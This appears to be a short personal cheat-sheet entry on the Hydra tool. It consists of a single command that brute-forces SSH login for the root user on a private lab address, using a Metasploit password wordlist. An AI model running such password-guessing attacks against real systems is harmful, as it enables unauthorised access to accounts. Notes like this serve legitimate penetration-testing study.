# Hydra

## SSH Bruteforce

### known username, password list

```bash
hydra -v -V -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt 192.168.88.129 ssh -t 8
```
